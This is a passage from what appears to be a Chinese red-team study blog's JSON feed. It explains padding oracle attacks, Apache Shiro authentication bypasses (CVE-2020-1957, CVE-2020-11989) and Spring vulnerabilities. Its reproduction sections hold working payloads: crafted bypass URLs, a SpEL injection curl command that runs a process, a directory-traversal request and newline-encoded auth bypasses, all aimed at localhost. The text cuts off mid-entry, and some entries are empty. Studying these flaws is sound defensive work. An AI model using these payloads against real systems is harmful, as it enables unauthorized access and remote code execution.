依次执行块加密，最后将每一块的密文拼接成密文  \n</code></pre></div><p>由于初始化向量（IV）每次加密都是随机的，所以IV经常会被放在密文的前面，解密时先获取前面的IV，再对后面的密文进行解密。</p>\n<figure><figcaption>企业微信截图_20230515170316</figcaption></figure>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>1. 会将密文进行分组（按照加密采用的分组大小），前面的第一组是初始化向量，从第二组开始才是真正的密文\n2. 使用加密密钥对密文的第一组进行解密，得到”中间值“  \n3. 将中间值和初始化向量进行异或，得到该组的明文\n4. 前一块密文是后一块密文的IV，通过异或中间值，得到明文\n5. 块全部解密完成后，拼接得到明文，密码算法校验明文的格式（填充格式是否正确）\n6. 校验通过得到明文，校验失败得到密文 \n</code></pre></div><p><strong>padding oracle attack破解明文与伪造密文</strong></p>\n<p>https://cloud.tencent.com/developer/article/2130129</p>\n<h3>2.3 Shiro 权限绕过漏洞原理及利用方式</h3>\n<p>代码：2-shiroSpringboot</p>\n<h4>（1）CVE-2020-1957</h4>\n<p><strong>shiro &lt; 1.5.2</strong></p>\n<p>本漏洞起源于 SHIRO-682。在Spring中，/resource/xx与/resource/xx/都会被截成/resource/xx以访问相应资源；在shiro中，/resource/xx与/resource/xx/被视为两个不同路径。所以在Spring集成shiro时，只需要在访问路径后添加/就存在绕过权限校验的可能。</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code> <span class=\"token comment\">//配置路径拦截规则，注意，要有序</span>\n        <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">&gt;</span></span> map <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">LinkedHashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        map<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/doLogin\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"anon\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//        map.put(\"/**\", \"authc\");</span>\n        map<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/hello/**\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"authc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>1.anon为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口</p>\n<p>2.authc为登录拦截器，需要登录认证才能访问的资源。</p>\n<p>org\\apache\\shiro\\web\\util\\WebUtils.class    PathMatchingFilterChainResolver加断点，访问/hello/1</p>\n<p>先getRequestUri()</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getRequestUri</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">String</span> uri <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">getAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"javax.servlet.include.request_uri\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>uri <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            uri <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getRequestURI</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token function\">normalize</span><span class=\"token punctuation\">(</span><span class=\"token function\">decodeAndCleanUriString</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> uri<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n</code></pre></div><p>调用normalize() 对decodeAndCleanUriString()处理得到的路径进行标准化处理. 标准化normalize()的处理包括:</p>\n<ul>\n<li>替换反斜线</li>\n<li>替换 // 为 /</li>\n<li>替换 /./ 为 /</li>\n<li>替换 /…/ 为 /</li>\n</ul>\n<figure><figcaption>img15</figcaption></figure>\n<p>最终会在PathMatchingFilterChainResolver中的getChain()方法进行校验，</p>\n<figure><figcaption>img16</figcaption></figure>\n<p>访问/hello/1 会匹配到/hello/*，但是/hello/1/就匹配不到了，shiro会认为这个不需要登录，会放行 。</p>\n<p>​\t\t在使用了shiro的项目中，我们请求的URL(URL1)，经过shiro权限检验(URL2)，最后到springboot项目找到路由来处理(URL3) 漏洞的出现就在URL1,URL2和URL3 有可能不是同一个URL，这就导致我们能绕过shiro的校验，直接访问后端需要首选的URL。</p>\n<p>（1）配置拦截规则</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>[urls]\n/index.html = anon\n/user/** = authc\n</code></pre></div><p>（2）构造原始URL: <code>/xxxx/..;/admin/index</code> （URL1）</p>\n<p>（3）权限校验时会对传入的URL进行标准化处理，以 ;截断后面的请求，所以此时URL变为URL2  /xxxx/.. ，  /xxxx/.. 不会匹配到/admin/** ，所以shiro权限校验就会通过。</p>\n<p>（4）原始请求 <code>/xxxx/..;/admin/index</code> 进入到 springboot中，springboot对于每一个进入的request请求也会有自己的处理方式，Spring会先获取分号的位置，并检测分号后是否存在/，如果有，将/的位置记录在slashIndex变量中，并将分号前的数据与/之后的数据进行拼接，从而让/xxxx/..;/admin/index变为/xxxx/../admin/index，即为/admin/index。</p>\n<p>（5）最后，我们来数理一下整个请求过程：</p>\n<ol>\n<li>客户端请求URL: <code>/xxxx/..;/admin/index</code></li>\n<li>shrio 内部处理得到校验URL为 <code>/xxxx/..</code>校验通过</li>\n<li>springboot 处理 <code>/xxxx/..;/admin/index</code> , 最终请求 <code>/admin/index</code>, 成功访问了后台请求.</li>\n</ol>\n<h4>（2）CVE-2020-11989</h4>\n<p>SHIRO-782</p>\n<p>由于shiro先获取的url，然后会判断分号是否存在，如果存在就会把后面的删除，进入shiro匹配，匹配不上默认放行，之后Spring web对路径进行规范化从而访问到了相应的页面。</p>\n<p>进入decodeAndCleanUriString方法，发现此方法会以分号将传入的URI进行截断，并将分号以及分号后面的数据进行清空，返回分号前面的URI数据，从而让/a/b;/c变为/a/b。</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">String</span> <span class=\"token function\">decodeAndCleanUriString</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> uri<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        uri <span class=\"token operator\">=</span> <span class=\"token function\">decodeRequestString</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> uri<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> semicolonIndex <span class=\"token operator\">=</span> uri<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token char\">';'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>semicolonIndex <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token operator\">?</span> uri<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> semicolonIndex<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> uri<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n</code></pre></div><p>Spring拦截器的decodeAndCleanUriString方法中，Spring对于分号处理的方式与Shiro不同，Spring会先获取分号的位置，并检测分号后是否存在/，如果有，将/的位置记录在slashIndex变量中，并将分号前的数据与/之后的数据进行拼接，从而让/a/b;/c变为/a/b/c。返回处理后的requestURI。</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> <span class=\"token function\">decodeAndCleanUriString</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> uri<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        uri <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">removeSemicolonContent</span><span class=\"token punctuation\">(</span>uri<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        uri <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">decodeRequestString</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">,</span> uri<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        uri <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">getSanitizedPath</span><span class=\"token punctuation\">(</span>uri<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> uri<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n</code></pre></div><p>所以访问/;/hello/1结果如下</p>\n<figure><figcaption>img17</figcaption></figure>\n<p>下面两种都能绕过</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>map.put(\"/hello/**\", \"authc\");\nmap.put(\"/hello/*\", \"authc\");\n</code></pre></div><p>只有这么写的时候，才不存在问题</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>map.put(\"/**\", \"authc\");\n</code></pre></div><p>（3）CVE-2020-13933</p>\n<p>（4）CVE-2022-32532</p>\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "反序列化_shiro_CVE-2019-12422_shiro721反序列化命令执行漏洞",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/shiro/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_shiro_CVE-2019-12422_shiro721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/shiro/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_shiro_CVE-2019-12422_shiro721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html",
      "summary": "反序列化_shiro_CVE-2019-12422_shiro721反序列化命令执行漏洞\n\n\n漏洞介绍\n\n国家信息安全漏洞库 (cnnvd.org.cn)\nNVD - Search and Statistics (nist.gov)\n\n\nApache Shiro™（读作“sheeroh”，即日语“城”）是一个开源安全框架，提供身份验证、授权、密码学和会...",
      "content_html": "\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "权限绕过_shiro_CVE-2020-11989_Apache Shiro782权限绕过漏洞",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/shiro/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87_shiro_CVE-2020-11989_Apache%20Shiro782%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/shiro/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87_shiro_CVE-2020-11989_Apache%20Shiro782%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.html",
      "summary": "权限绕过_shiro_CVE-2020-11989_Apache Shiro782权限绕过漏洞\n\n\n漏洞介绍\n\n国家信息安全漏洞库 (cnnvd.org.cn)\nNVD - Search and Statistics (nist.gov)\n\n\nApache Shiro是美国阿帕奇（Apache）软件基金会的一套用于执行认证、授权、加密和会话管理的Jav...",
      "content_html": "\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "权限绕过_shiro_CVE-2020-13933_Apache Shiro权限绕过漏洞",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/shiro/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87_shiro_CVE-2020-13933_Apache%20Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/shiro/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87_shiro_CVE-2020-13933_Apache%20Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.html",
      "summary": "权限绕过_shiro_CVE-2020-13933_Apache Shiro权限绕过漏洞\n\n漏洞介绍\n\n国家信息安全漏洞库 (cnnvd.org.cn)\nNVD - Search and Statistics (nist.gov)\n\n\nApache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。2020年6月22日，...",
      "content_html": "\n",
      "date_published": "2024-11-15T10:05:31.000Z",
      "date_modified": "2024-11-15T10:05:31.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "web主流应用漏洞-Spring",
      "url": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/spring/spring.html",
      "id": "https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/spring/spring.html",
      "summary": "web主流应用漏洞-Spring\n1. Spring介绍\n1.1 什么是Spring\nSpring是功能强大的组件粘合剂，贯穿表现层、业务层、持久层。能够将所有的java功能模块用配置文件的方式组合起来成为一个完整的应用，可以帮助Java程序员解决许多在J2EE(企业级分布式应用程序开发规范)开发中常见的的问题。\n\nSpring框架代码下载地址:\nht...",
      "content_html": "\n<h2>1. Spring介绍</h2>\n<h3>1.1 什么是Spring</h3>\n<p>Spring是功能强大的组件粘合剂，贯穿表现层、业务层、持久层。能够将所有的java功能模块用配置文件的方式组合起来成为一个完整的应用，可以帮助Java程序员解决许多在J2EE(企业级分布式应用程序开发规范)开发中常见的的问题。</p>\n<blockquote>\n<p>Spring框架代码下载地址:</p>\n<p>https://github.com/spring-projects/spring-framework/releases</p>\n<p>https://repo.spring.io/ui/native/libs-release-local/org/springframework/spring/</p>\n<p>https://mvnrepository.com/search?q=spring</p>\n</blockquote>\n<p>最新版本5.3.27</p>\n<h3>1.2 Spring Framework的组成模块</h3>\n<p>Spring Framework项目是整个Spring生态的基础，包含了Spring最核心的功能，如：IOC，AOP，Spring MVC等，</p>\n<blockquote>\n<p>IOC控制反转，把对象的创建和对象之间的调用过程，交给Spring管理</p>\n<p>AOP面向切面编程，通过预编译方式和运行期间动态代理实现程序功能的统一维护，它所面对的是处理过程中的某个步骤或阶段，以获得各部分之间低耦合的隔离效果</p>\n<p>OOP面向对象编程 针对业务逻辑处理过程中的实体及其属性和行进行抽象封装，获得更加清晰高效的逻辑单元划分</p>\n</blockquote>\n<p>Spring Framework包含多个子模块，如：spring-core，spring-beans，spring-context，spring-aop，spring-web，spring-webmvc等等。各模块之间又存在依赖关系。例如我们在Java Web项目中使用得最多的Spring MVC实际上就是模块spring-webmvc</p>\n<p>Spring框架包含的功能大约由20个小模块组成。这些模块按组可分为核心容器(Core Container)、数据访问/集成(Data Access/Integration)、Web、面向切面编程(AOP和Aspects)、设备(Instrumentation)、消息(Messaging)和测试(Test)。如下图所示：</p>\n<blockquote>\n<p>除了最核心的Spring Core Container(即Spring容器)是必要模块之外，其他模块都是可选</p>\n</blockquote>\n<figure><figcaption>1745215-20200715183321528-138974993</figcaption></figure>\n<p>(1) 核心容器(Core Container)——Beans、Core、Context、Expression</p>\n<p>该层由4个模块组成：spring-beans spring-core spring-context spring-expression(spring expression Language,SpEl) 。它们对应的jar包如下：</p>\n<ol>\n<li>spring-core：该模块是依赖注入IoC与DI的最基本实现。</li>\n<li>spring-beans：该模块是Bean工厂与bean的装配。</li>\n<li>spring-context：该模块构架于核心模块之上，它扩展了 BeanFactory，为它添加了 Bean 生命周期控制、框架事件体系以及资源加载透明化等功能。ApplicationContext 是该模块的核心接口，它的超类是 BeanFactory。与BeanFactory 不同，ApplicationContext 容器实例化后会自动对所有的单实例 Bean 进行实例化与依赖关系的装配，使之处于待用状态。</li>\n<li>spring-context-indexer：该模块是 Spring 的类管理组件和 Classpath 扫描。</li>\n<li>spring-context-support：该模块是对 Spring IOC 容器的扩展支持，以及 IOC 子容器。</li>\n<li><strong>spring-expression：该模块是Spring表达式语言块是统一表达式语言（EL）的扩展模块，可以查询、管理运行中的对象，同时也方便的可以调用对象方法、操作数组、集合等。</strong></li>\n</ol>\n<p>(2) 数据访问与集成(Data Access/Integration)——Jdbc、Orm、Oxm、Jms、Transactions</p>\n<p>该层由spring-jdbc、spring-tx、spring-orm、spring-jms 和 spring-oxm 5 个模块组成。它们对应的jar包如下：</p>\n<ol>\n<li>spring-jdbc：该模块提供了 JDBC抽象层，它消除了冗长的 JDBC 编码和对数据库供应商特定错误代码的解析。</li>\n<li>spring-tx：该模块支持编程式事务和声明式事务，可用于实现了特定接口的类和所有的 POJO 对象。编程式事务需要自己写beginTransaction()、commit()、rollback()等事务管理方法，声明式事务是通过注解或配置由 spring 自动处理，编程式事务粒度更细。</li>\n<li>spring-orm：该模块提供了对流行的对象关系映射 API的集成，包括 JPA、JDO 和 Hibernate 等。通过此模块可以让这些 ORM 框架和 spring 的其它功能整合，比如前面提及的事务管理。</li>\n<li>spring-oxm：该模块提供了对 OXM 实现的支持，比如JAXB、Castor、XML Beans、JiBX、XStream等。</li>\n<li>spring-jms：该模块包含生产（produce）和消费（consume）消息的功能。从Spring 4.1开始，集成了 spring-messaging 模块。</li>\n</ol>\n<p>(3) Web——Web、Webmvc、WebFlux、Websocket</p>\n<p>该层由 spring-web、spring-webmvc、spring-websocket 和 spring-webflux 4 个模块组成。它们对应的jar包如下：</p>\n<ol>\n<li>spring-web：该模块为 Spring 提供了最基础 Web 支持，主要建立于核心容器之上，通过 Servlet 或者 Listeners 来初始化 IOC 容器，也包含一些与 Web 相关的支持。</li>\n<li>spring-webmvc：该模块众所周知是一个的 Web-Servlet 模块，实现了 Spring MVC（model-view-Controller）的 Web 应用。</li>\n<li>spring-websocket：该模块主要是与 Web 前端的全双工通讯的协议。</li>\n<li>spring-webflux：该模块是一个新的非堵塞函数式 Reactive Web 框架，可以用来建立异步的，非阻塞，事件驱动的服务，并且扩展性非常好。</li>\n</ol>\n<p>(4) 面向切面编程——AOP，Aspects</p>\n<p>该层由spring-aop和spring-aspects 2个模块组成。它们对应的jar包如下：</p>\n<ol>\n<li>spring-aop：该模块是Spring的另一个核心模块，是 AOP 主要的实现模块**。**</li>\n<li>spring-aspects：该模块提供了对 AspectJ 的集成，主要是为 Spring AOP提供多种 AOP 实现方法，如前置方法后置方法等。</li>\n</ol>\n<p>(5) 设备(Instrumentation)——Instrmentation</p>\n<p>spring-instrument：该模块是基于JAVA SE 中的\"java.lang.instrument\"进行设计的，应该算是 AOP的一个支援模块，主要作用是在 JVM 启用时，生成一个代理类，程序员通过代理类在运行时修改类的字节，从而改变一个类的功能，实现 AOP 的功能。</p>\n<p>(6) 消息(Messaging)——Messaging</p>\n<p>spring-messaging：<strong>该模块是从 Spring4 开始新加入的一个模块，主要职责是为 Spring 框架集成一些基础的报文传送应用。</strong></p>\n<p>(7) 测试（Test）——Test</p>\n<p>spring-test**：该模块主要为测试提供支持的，通过 JUnit 和 TestNG 组件支持单元测试和集成测试。它提供了一致性地加载和缓存 Spring 上下文，也提供了用于单独测试代码的模拟对象（mock object）。**</p>\n<h3>1.3 Spring Framework的特点</h3>\n<p>--优点：</p>\n<ol>\n<li>方便解耦，简化开发：通过Spring提供的IoC容器，我们可以将对象之间的依赖关系交由Spring进行控制，避免硬编码所造成的过度程序耦合。有了Spring，用户不必再为单实例模式类、属性文件解析等这些很底层的需求编写代码，可以更专注于上层的应用。</li>\n<li>AOP编程的支持：通过Spring提供的AOP功能，方便进行面向切面的编程，许多不容易用传统OOP实现的功能可以通过AOP轻松应付。</li>\n<li>声明式事务的支持：在Spring中，我们可以从单调烦闷的事务管理代码中解脱出来，通过声明式方式灵活地进行事务的管理，提高开发效率和质量。</li>\n<li>方便程序的测试：可以用非容器依赖的编程方式进行几乎所有的测试工作，在Spring里，测试不再是昂贵的操作，而是随手可做的事情。例如：Spring对Junit4支持，可以通过注解方便的测试Spring程序。</li>\n<li>方便集成各种优秀框架：Spring不排斥各种优秀的开源框架，相反，Spring可以降低各种框架的使用难度，Spring提供了对各种优秀框架（如Struts,Hibernate、Hessian、Quartz）等的直接支持。</li>\n<li>轻量级的框架：从大小与开销两方面而言Spring都是轻量的。现在完整的Spring5框架只有82MB。并且Spring所需的处理开销也是微不足道的。</li>\n<li>非入侵式的框架：Spring框架是一个非入侵式的框架，就是我们的系统使用了Spring，但系统完全不依赖于Spring的特定类。</li>\n<li>降低Java EE API的使用难度：Spring对很多难用的Java EE API（如JDBC，JavaMail，远程调用等）提供了一个封装层，通过Spring的简易封装，这些Java EE API的使用难度大为降低。</li>\n<li>Java 源码是经典学习范例：Spring的源码设计精妙、结构清晰，Spring框架源码是Java技术的较好实践范例。</li>\n</ol>\n<p>那么再好的框架，肯定也是有缺点的。</p>\n<p>-<strong>-缺点</strong></p>\n<ol>\n<li><strong>不易拆分：spring框架整合其它框架都是黏在一起，后面拆分的话就不容易拆分了。</strong></li>\n<li><strong>配置繁琐：随着系统工程的增大，系统与第三方的配置文件会大量增加，这也是Spring最致命的地方</strong>，<strong>人称：“配置地狱”</strong>。</li>\n</ol>\n<h3>1.4 Spring扩展</h3>\n<p>Spring框架经过这么多年的发展，它已经衍生出了一个非常庞大的体系</p>\n<figure><figcaption>企业微信截图_20230518141458</figcaption></figure>\n<p>最主要有SpringBoot、SpringCloud等等。如下图所示：</p>\n<figure><figcaption>1745215-20200716211221200-1394479856</figcaption></figure>\n<ul>\n<li>SpringBoot的设计目的是用来简化 Spring 应用的开发过程。现在大部分企业都在使用SpringBoot进行快速开发，Springboot内部集成了很多第三方库的配置，所以它开箱即用。而且能够快速整合第三方框架，无需配置繁琐的文件，解决了Spring的弊端。基于Spring Boot可以快速的开发单个微服务。 SpringBoot的约定大于配置！</li>\n</ul>\n<blockquote>\n<p>约定优于配置（Convention Over Configuration）,也称作按约定编程是一种软件设计范式。目的在于减少软件开发人员所需要做出的决定的数量，从而获得简单的好处，而又不失去其中的灵活性。</p>\n</blockquote>\n<ul>\n<li>Spring Cloud 是一个基于Spring Boot实现的服务治理工具包，在微服务架构中用于管理和协调服务。</li>\n</ul>\n<blockquote>\n<p>微服务：就是把一个单体项目,拆分为多个微服务,每个微服务可以独立技术选型,独立开发,独立部署,独立运维.并且多个服务相互协调,相互配合,最终完成用户的价值.</p>\n</blockquote>\n<p>其中Spring Boot 是基于 Spring Framework 来构建的，Spring Cloud 是构建 Spring Boot 分布式环境。所以Spring Boot 是中流砥柱，起到承上启下的作用：</p>\n<p>但是注意：正是因为SpringBoot简化了开发，开箱即用，所以很多人都跳过了Spring的学习，学到后面这个注解那个类是什么都不知道。所以学习SpringBoot的前提是需要完全掌握Spring以及SpringMVC的知识的，不要急于求成，必须要一步一步扎实基础。</p>\n<ul>\n<li>Spring Cloud Data Flow</li>\n</ul>\n<p>Spring Cloud Data Flow用于构建在云环境或K8S中基于微服务的实时或批数据处理架构，具体来讲就是支持一系列需要进行数据处理的场景，如：ETL，数据导入/导出，事件流，预测分析等等。</p>\n<ul>\n<li>Spring Data</li>\n</ul>\n<p>Spring Data旨在提供一套基于Spring编程模型的数据访问API，是一个数据访问框架集合，其中包含了多个具体的支持不同方式访问特定数据库类型的子模块，如：Spring Data JDBC（使用JDBC方式访问关系型数据库），Spring Data MongoDB（访问MongoDB数据库）等。这个模块的功能类似于MyBatis这样的专门的ORM框架，在实际开发中可以根据需求进行灵活选择。</p>\n<h3>1.5 历史漏洞</h3>\n<figure><figcaption>企业微信截图_20230518144305</figcaption></figure>\n<h2>2. 部分历史漏洞讲解</h2>\n<h3>2.1 Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</h3>\n<h4>漏洞简介</h4>\n<p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 部分版本存在漏洞，攻击者可构造包含有恶意代码的SPEL表达式实现远程代码攻击，直接获取服务器控制权限。</p>\n<blockquote>\n<p>Spring Data Commons 1.13 to 1.13.10</p>\n<p>Spring Data Commons 2.0 to 2.0.5</p>\n</blockquote>\n<h4>简单代码分析</h4>\n<p>org.springframework.data.web.MapDataBinder类中，Spring 在自动解析用户的参数的时候采用了SpelExpressionParser 来解析 propertyName，但是并没有对参数进行进行有效的校验。</p>\n<figure><figcaption>企业微信截图_20230518160531</figcaption></figure>\n<h4>漏洞复现</h4>\n<p>exp如下：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>curl -X POST http://localhost:8080/account -d \"name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('calc.exe')]=123\"\n</code></pre></div><figure><figcaption>企业微信截图_20230518160733</figcaption></figure>\n<h3>2.2 Spring Boot Actuator Logview 目录遍历漏洞（CVE-2021-21234）</h3>\n<h4>漏洞简介</h4>\n<p>spring-boot-actuator-logview 是一个简单的日志文件查看器作为Spring Boot执行器端点，在 0.2.13 版本之前存在着目录遍历漏洞，编号 CVE-2021-21234。漏洞本质是Spring Boot 执行器通过请求的参数来指定文件名和文件夹路径，经过组合拼接达到目录遍历，虽然源码中检查了文件名参数filename来防止目录遍历，但是没有检查文件夹参数base，造成了目录遍历。目录遍历漏洞允许恶意攻击者突破Web应用程序的安全控制，直接访问攻击者想要的敏感数据 ，包括配置文件、日志、源代码等，配合其它漏洞的综合利用，攻击者可以轻易的获取更高的权限。</p>\n<blockquote>\n<p>spring boot &lt; 0.2.13</p>\n</blockquote>\n<h4>简单代码分析</h4>\n<p>eu.hinsch.spring.boot.actuator.logview.LogViewEndpoint类中，view函数对filename参数进行合法性校验，但是没有对base参数进行合法性校验。</p>\n<figure><figcaption>企业微信截图_20230518170001</figcaption></figure>\n<p>filename的校验函数</p>\n<figure><figcaption>企业微信截图_20230518170157</figcaption></figure>\n<h4>漏洞复现</h4>\n<p>在D盘下有一个文件aa.txt，访问如下URL</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>http://127.0.0.1:8887/manage/log/view?filename=aa.txt&amp;base=../../../../../../../../\n</code></pre></div><figure><figcaption>企业微信截图_20230518170325</figcaption></figure>\n<h3>2.3 Spring Security 认证绕过漏洞（CVE-2022-22978）</h3>\n<h4>漏洞简介</h4>\n<p>当Spring-security使用 RegexRequestMatcher 进行权限配置，由于RegexRequestMatcher正则表达式配置权限的特性，正则表达式中包含“.”时，未经身份验证攻击者可以通过构造恶意数据包绕过身份认证。</p>\n<blockquote>\n<p>Spring Security 5.5.x &lt; 5.5.7</p>\n<p>Spring Security 5.6.x &lt; 5.6.4</p>\n</blockquote>\n<h4>简单代码分析</h4>\n<p>使用默认的正侧匹配方式，用正则匹配流量的过程中发现正则“.”号不匹配换行符</p>\n<figure><figcaption>image-20230519091534753</figcaption></figure>\n<figure><figcaption>image-20230519093650310</figcaption></figure>\n<p>修复后结果如下（https://github.com/spring-projects/spring-security/compare/5.6.3...5.6.4）：</p>\n<figure><figcaption>image-20230519092639570</figcaption></figure>\n<h4>漏洞复现</h4>\n<p>访问<code>http://127.0.0.1:8080/admin/1</code>会因为没有登录而跳转到login界面</p>\n<figure><figcaption>image-20230519091307641</figcaption></figure>\n<p>访问如下即可绕过</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>http://127.0.0.1:8080/admin/1%0d\nhttp://127.0.0.1:8080/admin/1%0a\n</code></pre></div><figure><figcaption>image-20230519091204228</figcaption></figure>\n<h3>2.4 Spring Framework 远程代码执行漏洞（CVE-2022-22965）</h3>\n<h4>漏洞简介</h4>\n<p>22年3月爆出漏洞，原理可以参考https://paper.seebug.org/1877/。利用SpringMVC参数绑定机制，通过请求传入的参数，控制了Tomcat 